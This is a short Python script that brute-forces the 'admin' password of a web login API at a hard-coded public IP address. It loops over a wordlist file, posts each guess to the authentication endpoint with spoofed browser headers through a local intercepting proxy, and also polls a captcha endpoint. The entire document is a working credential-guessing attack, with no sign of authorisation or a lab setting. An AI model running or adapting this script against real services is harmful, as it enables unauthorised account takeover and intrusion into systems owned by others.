import os
import requests
import time
import json

def bruteforce(passw):
    url = "http://52.131.87.180:8086"
    subfix = "/api/user/auth"
    subfix_1 = "/api/user/captcha"
    data_1 = {
        'username': 'admin',
        'password': str(passw),
        'grantType': 'password'
    }
    proxy = {
        "https": "127.0.0.1:8080",
        "http": "127.0.0.1:8080"
    }
    headers_1  = {
        'Host': '52.131.87.180:8086',
        'Content-Length': str(len(data_1)),
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Content-Type': 'application/json;charset=UTF-8',
        'Origin': 'http://52.131.87.180:8086',
        'Referer': 'http://52.131.87.180:8086/index.html',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    header_2 = {
        'Host': '52.131.87.180:8086',
        'Content-Length': '0',
        'Accept': 'application/json, text/plain, */*',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Origin': 'http://52.131.87.180:8086',
        'Referer': 'http://52.131.87.180:8086/index.html',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
        'Connection': 'close'
    }
    r = requests.post(headers=headers_1,data=json.dumps(data_1),url=url+subfix,proxies=proxy,allow_redirects=False)
    r_1 = requests.post(headers=header_2,url=url+subfix_1,proxies=proxy,allow_redirects=False)
    return r.text, r_1.status_code

if __name__ == "__main__":
    with open("1000.txt", "r")as f:
        for i in f.readlines():
            i = i.strip()
            a,b = bruteforce(i)
            print(str(a),str(b))
            time.sleep(1)
